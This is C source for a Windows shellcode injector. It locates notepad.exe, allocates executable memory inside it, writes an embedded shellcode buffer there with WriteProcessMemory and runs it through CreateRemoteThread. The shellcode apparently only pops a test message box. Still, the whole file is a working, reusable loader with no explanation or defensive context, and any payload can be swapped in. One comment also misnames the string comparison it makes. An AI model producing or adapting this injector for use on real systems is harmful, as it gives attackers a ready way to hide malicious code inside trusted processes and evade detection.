#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
int main(int argc, char **argv){
    unsigned char buf[] = 
    "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64"
    "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e"
    "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60"
    "\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b"
    "\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01"
    "\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
    "\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01"
    "\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
    "\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89"
    "\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45"
    "\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff"
    "\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
    "\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
    "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24"
    "\x52\xe8\x5f\xff\xff\xff\x68\x4f\x57\x58\x20\x68\x48\x45"
    "\x4c\x4c\x31\xdb\x88\x5c\x24\x06\x89\xe3\x68\x78\x74\x58"
    "\x20\x68\x65\x20\x74\x65\x68\x6c\x63\x6f\x64\x68\x73\x68"
    "\x65\x6c\x31\xc9\x88\x4c\x24\x0e\x89\xe1\x31\xd2\x52\x53"
    "\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08";
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Take a snapshot of all processes
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("Error: Unable to create process snapshot.\n");
        return 1;
    }

    // Get the first process
    if (Process32First(snapshot, &pe32)) {
        do {
            // Compare process name with "notepad.exe" using strcmp (ANSI comparison)
            if (wcscmp(pe32.szExeFile, L"notepad.exe") == 0) {
                printf("Found notepad.exe with PID: %u\n", pe32.th32ProcessID);

                // Open the target process with PROCESS_ALL_ACCESS
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
                if (hProcess == NULL) {
                    printf("Error: Unable to open process. Error code: %u\n", GetLastError());
                    return 1;
                }

                // Allocate memory in the target process
                LPVOID allocated_mem = VirtualAllocEx(hProcess, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
                if (allocated_mem == NULL) {
                    printf("Memory allocation failed. Error code: %u\n", GetLastError());
                    CloseHandle(hProcess);
                    return 1;
                }

                printf("Memory allocated at: 0x%p\n", allocated_mem);

                // Write the shellcode into the allocated memory
                if (!WriteProcessMemory(hProcess, allocated_mem, buf, sizeof(buf), NULL)) {
                    printf("Failed to write to process memory. Error code: %u\n", GetLastError());
                    VirtualFreeEx(hProcess, allocated_mem, 0, MEM_RELEASE);
                    CloseHandle(hProcess);
                    return 1;
                }

                // Create a remote thread to execute the shellcode
                HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);
                if (hThread == NULL) {
                    printf("Failed to create remote thread. Error code: %u\n", GetLastError());
                    VirtualFreeEx(hProcess, allocated_mem, 0, MEM_RELEASE);
                    CloseHandle(hProcess);
                    return 1;
                }

                // Wait for the shellcode to finish executing
                WaitForSingleObject(hThread, INFINITE);

                // Clean up
                VirtualFreeEx(hProcess, allocated_mem, 0, MEM_RELEASE);
                CloseHandle(hThread);
                CloseHandle(hProcess);

                break; // Exit the loop after injecting into the first found instance of notepad.exe
            }
        } while (Process32Next(snapshot, &pe32)); // Loop through the processes
    }

    CloseHandle(snapshot);
    
    return 0; 
}